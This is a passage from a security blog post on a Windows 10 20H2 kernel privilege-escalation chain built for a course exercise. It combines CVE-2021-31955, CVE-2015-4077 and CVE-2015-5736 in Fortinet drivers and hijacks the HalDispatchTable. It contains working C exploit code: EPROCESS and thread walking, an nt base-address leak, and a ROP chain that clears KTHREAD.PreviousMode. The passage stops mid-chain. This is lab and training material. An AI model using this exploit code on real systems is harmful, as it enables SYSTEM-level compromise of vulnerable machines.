<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Finding A Needle In A KSTACK | ApexPredator’s Blog</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Finding A Needle In A KSTACK" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="I ran in to an issue with triggering a bugcheck AKA the Blue Screen Of Death or BSOD on Windows 10 20H1 while solving an Extra Mile exercise in the EXP-401 course. The challenge was to change the exploit from the course material targeting CVE-2021-1732 from a Data Only attack to Code Execution." />
<meta property="og:description" content="I ran in to an issue with triggering a bugcheck AKA the Blue Screen Of Death or BSOD on Windows 10 20H1 while solving an Extra Mile exercise in the EXP-401 course. The challenge was to change the exploit from the course material targeting CVE-2021-1732 from a Data Only attack to Code Execution." />
<link rel="canonical" href="https://apexpredator-infosec.github.io/posts/2025/01/01/Finding-A-Needle-In-A-KSTACK.html" />
<meta property="og:url" content="https://apexpredator-infosec.github.io/posts/2025/01/01/Finding-A-Needle-In-A-KSTACK.html" />
<meta property="og:site_name" content="ApexPredator’s Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-01-01T13:16:45-05:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Finding A Needle In A KSTACK" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-01-01T13:16:45-05:00","datePublished":"2025-01-01T13:16:45-05:00","description":"I ran in to an issue with triggering a bugcheck AKA the Blue Screen Of Death or BSOD on Windows 10 20H1 while solving an Extra Mile exercise in the EXP-401 course. The challenge was to change the exploit from the course material targeting CVE-2021-1732 from a Data Only attack to Code Execution.","headline":"Finding A Needle In A KSTACK","mainEntityOfPage":{"@type":"WebPage","@id":"https://apexpredator-infosec.github.io/posts/2025/01/01/Finding-A-Needle-In-A-KSTACK.html"},"url":"https://apexpredator-infosec.github.io/posts/2025/01/01/Finding-A-Needle-In-A-KSTACK.html"}</script>
<!-- End Jekyll SEO tag -->
<link id="main-stylesheet" rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://apexpredator-infosec.github.io/feed.xml" title="ApexPredator&apos;s Blog" />
</head>
<body><header class="site-header">

  <div class="wrapper">
    <a class="site-title" rel="author" href="/">ApexPredator&#39;s Blog</a>
      <nav class="site-nav">
        <input type="checkbox" id="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon"></span>
        </label>

        <div class="nav-items">
  <a class="nav-item" href="/about/">About</a>
</div>

      </nav>
  </div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Finding A Needle In A KSTACK</h1>
    <div class="post-meta">
      <time class="dt-published" datetime="2025-01-01T13:16:45-05:00" itemprop="datePublished">
        Jan 1, 2025
      </time>
    </div>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>I ran in to an issue with triggering a bugcheck AKA the Blue Screen Of Death or BSOD on Windows 10 20H1 while solving an Extra Mile exercise in the EXP-401 course. The challenge was to change the exploit from the course material targeting CVE-2021-1732 from a Data Only attack to Code Execution.</p>

<p>In a Data Only Attack we use the read/write primitives of the exploit to find the SYSTEM process and copy it’s token to our current process thus elevating our process to SYSTEM integrity. This prevents us from having to execute shellcode or dynamic code in the kernel, which would be stopped by Hypervisor-protected Code Integrity (HVCI). HVCI works sort of like Arbitrary Code Guard (ACG) in user-mode, but protects the kernel-mode memory. The gist at a high level is code is immutable, dynamic code is bad and should not run and therefor HVCI makes it impossible to run dynamic code. You can read more about HVCI on the Microsoft site. <a href="https://learn.microsoft.com/en-us/windows/security/hardware-security/enable-virtualization-based-protection-of-code-integrity?tabs=security">HVCI</a> HVCI has to be turned off by removing the Hyper-V role and disabling Virtualization Based Security (VBS) in the VM to play around with the kernel-mode code execution challenge. A Windows 10 20H2 VM without HVCI/VBS is used in the demo for this blog.</p>

<p>The task seemed easy enough:</p>
<ol>
  <li>Allocate user-mode memory</li>
  <li>Copy token stealing shellcode to the user-mode memory address that I control</li>
  <li>Enumerate the Page Table Entry (PTE) for that user-mode memory address I control</li>
  <li>Use the read and write primitives to change the User/Supervisor (U/S) bit to S AKA 0</li>
  <li>Hijack execution through the HalDispatchTable by replacing HalDispatchTable+0x08 (HaliQuerySystemInformation) with the address of my shellcode</li>
  <li>Trigger HalDispatchTable+0x08 from user-mode</li>
  <li>Start a command prompt cmd.exe</li>
</ol>

<p>In reality it was not that simple. I will walk through a similar scenario of solving the HalDispatchTable hijack in this blog with a little Reverse Engineering (RE) and a lot of kernel debugging. I will also switch from the TagWND exploit CVE-2021-1732 to attacking CVE-2021-31955, CVE-2015-4077, and CVE-2015-5736 on Windows 10 20H2 to avoid spoiling the Extra Mile from EXP-401. This attacks the forti shield driver and a native windows information leak for a full chain. I built this exploit combining two public POCs and making modifications for OS version and to target code execution through the HalDispatchTable. There is also an Extra Mile in EXP-401 2025 course version to solve that same forti shield exploit, but it is on a different version of the OS so my hard coded offsets won’t work and you will BSOD if you just try to run it to solve that one. If you wish to follow along in your own lab you will need a Windows 10 20H2 VM with Fortinet FortiClient 5.2.3 installed. You will also need a VM for kernel debugging with WinDbg.</p>

<p>This blog is intended to be a deeper dive on the HalDispatchTable and issues caused by HVCI and will be lighter on the explanation of the CVEs.</p>

<p>CVE-2021-31955 is a native Windows kernel vulnerability that allows for leaking the EPROCESS address for all processes running on the system. the high level overview is that poor access controls allowed using the SUPERFETCH feature in the NtQuerySystemInformation API in low integrity to query the EPROCESS address of each running process.</p>

<p>freeide’s POC code <a href="https://github.com/freeide/CVE-2021-31955-POC/tree/main/CVE-2021-31955">CVE-2021-31955</a>was used and slightly modified to work in this exploit. The main changes were adding a target process name parameter to the GetEprocessAddress() function, modifying the for loops to find the target process and only print it’s EPROCESS instead of all running processes, and returning the target process EPROCESS address as a ULONGLONG instead of returning void. A walkEprocess() function was also added to return the KTHREAD from passing in the EPROCESS. You will notice variations in naming conventions for functions and variables in this POC. This is because I’m lazy and felt it too tedious to modify the combined POCs into a single consistent naming convention. I’m ok with you judging me for that.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ULONGLONG</span> <span class="n">GetEprocessAddress</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">target</span><span class="p">)</span>
<span class="p">....</span>

	<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">targetName</span> <span class="o">=</span> <span class="n">target</span><span class="p">;</span>
	<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">procName</span><span class="p">;</span>

	<span class="k">for</span> <span class="p">(</span><span class="n">ULONG</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">sv3plus_request</span><span class="o">-&gt;</span><span class="n">InfoCount</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">procName</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sv3plus_request</span><span class="o">-&gt;</span><span class="n">InfoArrayV3Plus</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">data</span><span class="p">[</span><span class="mh">0x14</span><span class="p">];</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">procName</span><span class="p">,</span> <span class="n">targetName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
			<span class="c1">//printf("%15s\t%5d\t%p\n", procName, sv3plus_request-&gt;InfoArrayV3Plus[i].ProcessId, sv3plus_request-&gt;InfoArrayV3Plus[i].EProcess);</span>
			<span class="k">return</span> <span class="n">sv3plus_request</span><span class="o">-&gt;</span><span class="n">InfoArrayV3Plus</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">EProcess</span><span class="p">;</span>
		<span class="p">}</span>

<span class="p">...</span>
<span class="n">ULONGLONG</span> <span class="n">walkEprocess</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">driver</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">eProcess</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">DWORD</span> <span class="n">currentTid</span> <span class="o">=</span> <span class="n">GetCurrentThreadId</span><span class="p">();</span>

	<span class="n">ULONGLONG</span> <span class="n">listHead</span> <span class="o">=</span> <span class="n">eProcess</span> <span class="o">+</span> <span class="n">EPROCESS_ThreadListHead_Offset</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">flink</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">listHead</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>

	<span class="k">while</span> <span class="p">(</span><span class="n">flink</span> <span class="o">!=</span> <span class="n">listHead</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">ULONGLONG</span> <span class="n">ethread</span> <span class="o">=</span> <span class="n">flink</span> <span class="o">-</span> <span class="n">ETHREAD_ThreadListEntry_Offset</span><span class="p">;</span>

		<span class="n">ULONGLONG</span> <span class="n">uniqueTid</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">ethread</span> <span class="o">+</span> <span class="n">ETHREAD_Cid_Offset</span> <span class="o">+</span> <span class="n">CLIENTID_UniqueThread_Offset</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>

		<span class="k">if</span> <span class="p">((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">uniqueTid</span> <span class="o">==</span> <span class="n">currentTid</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">ULONGLONG</span> <span class="n">kthread</span> <span class="o">=</span> <span class="n">ethread</span><span class="p">;</span>  <span class="c1">// Tcb is at offset 0x0</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Found current thread:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[+] ETHREAD: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ethread</span><span class="p">);</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[+] KTHREAD: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kthread</span><span class="p">);</span>
			<span class="k">return</span> <span class="n">kthread</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="n">flink</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">flink</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>  <span class="c1">// Move to next thread</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Current thread not found in EPROCESS thread list.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div>

<p>CVE-2015-4077 is a vulnerability in the mdare64_48.sys driver from fortinet that allows reading arbitrary kernel memory. The POC uses the vulnerable Input/Output Control (IOCTL) number to read a specified kernel-mode memory address. This is what gives us the read primitive for our exploit.</p>

<p>Morten Schenk and Sickness’s POC code from <a href="https://www.exploit-db.com/exploits/45149">exploit-db</a> was used to exploit CVE-2015-4077 in this exploit. The leakNtBase() function required some updates to find the base address of nt. According to <a href="https://wumb0.in/finding-the-base-of-the-windows-kernel.html">wumb0</a> the .text section of nt was moved from offset 0x1000 in the ntoskrnl.exe to an offset of around 0x2000000. This broke Morten Schenk’s scan back method for finding the MZ header to recover the base address. It is fixable by subtracting a large value first before performing the scan back.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ULONGLONG</span> <span class="nf">leakNtBase</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">driver</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">kthread</span><span class="p">)</span>
<span class="p">{</span>

	<span class="n">ULONGLONG</span> <span class="n">ntAddr</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">kthread</span> <span class="o">+</span> <span class="mh">0x2a8</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">baseAddr</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">signature</span> <span class="o">=</span> <span class="mh">0x00905a4d</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">searchAddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">ntAddr</span><span class="o">-</span><span class="mh">0x300000</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFF000</span><span class="p">;</span>

	<span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">ULONGLONG</span> <span class="n">readData</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">searchAddr</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
		<span class="n">ULONGLONG</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">readData</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">;</span>
		
		<span class="c1">//printf("%llx\n", readData);</span>
		<span class="c1">//printf("%llx\n", tmp);</span>
		

		<span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">==</span> <span class="n">signature</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">baseAddr</span> <span class="o">=</span> <span class="n">searchAddr</span><span class="p">;</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="n">searchAddr</span> <span class="o">=</span> <span class="n">searchAddr</span> <span class="o">-</span> <span class="mh">0x1000</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">baseAddr</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>CVE-2015-5736 is a vulnerability in the fortishield.sys driver from fortinet that allows for arbitrary code execution in the kernel by allowing the user to set the call back function from user-mode. We use this vulnerable IOCTL to set a callback to a ROP chain that will clear the Previous Mode bit on our KTHREAD allowing us to create a kernel-mode write primitive. The easier version of this exploit would then allocate user-mode memory containing token stealing shellcode, flip the U/S bit on the PTE, and then utilize the vulnerable IOCTL again setting the callback function to our user-mode address containing our shellcode. We are going a slightly harder route and using the write primitive to hijack execution from the HalDispatchTable to allow us the chance to bypass another mitigation.</p>

<p>Morten Schenk and Sickness’s POC from <a href="https://www.exploit-db.com/exploits/45149">exploit-db</a> was also used to exploit CVE-2015-5736 in this exploit. The major changes were updating the ROP chain to work with Windows 10 20H2 and modifying it to use the HalDispatchTable for the shellcode execution instead of incorporating the shellcode execution in to the ROP chain or calling the vulnerable IOCTL a second time to execute the shellcode.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PULONGLONG</span> <span class="nf">allocate_fake_stack</span><span class="p">(</span><span class="n">ULONGLONG</span> <span class="n">ntBase</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">fortishield_callback</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">fortishield_restore</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">kThread</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">PULONGLONG</span> <span class="n">fake_stack</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x00000000B60E0000</span><span class="p">,</span> <span class="mh">0x14000</span><span class="p">,</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">fake_stack</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while allocating the fake stack: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">fake_stack</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x14000</span><span class="p">);</span>

	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x00</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x3f01bf</span><span class="p">;</span>		<span class="c1">// pop rax ; pop rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x08</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">fortishield_callback</span><span class="p">;</span>		<span class="c1">// Callback address</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2dd014</span><span class="p">;</span>		<span class="c1">// mov qword [rax], rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x3f01bf</span><span class="p">;</span>		<span class="c1">// pop rax ; pop rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kThread</span> <span class="o">+</span> <span class="mh">0x232</span><span class="p">;</span>			<span class="c1">// KTHREAD.PreviousMode</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x49584f</span><span class="p">;</span>		<span class="c1">// mov byte [rax], cl ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2017d0</span><span class="p">;</span>		<span class="c1">// pop rbx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x00000000b60f0110</span><span class="p">;</span>					<span class="c1">// Location on fake_stack</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2017f2</span><span class="p">;</span>		<span class="c1">// pop rax ; ret;</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x217527</span><span class="p">;</span>		<span class="c1">// mov rax, rcx ; add rsp, 0x28 ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x3cd671</span><span class="p">;</span>		<span class="c1">// mov rcx, rsi ; call rax</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x88</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x20de71</span><span class="p">;</span>		<span class="c1">// pop rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000028</span><span class="p">;</span>					<span class="c1">// Value to subtract to get RSP</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x029db2b</span><span class="p">;</span>		<span class="c1">// sub rax, rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xa0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x20de71</span><span class="p">;</span>		<span class="c1">// pop rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xa8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">fortishield_restore</span><span class="p">;</span>		<span class="c1">// Restore address</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xb0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2dd014</span><span class="p">;</span>		<span class="c1">// mov qword [rax], rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xb8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2b82ce</span><span class="p">;</span>		<span class="c1">// mov qword [rbx], rax ; add rsp, 0x20 ; pop rbx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xc0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xc8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xd0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xd8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
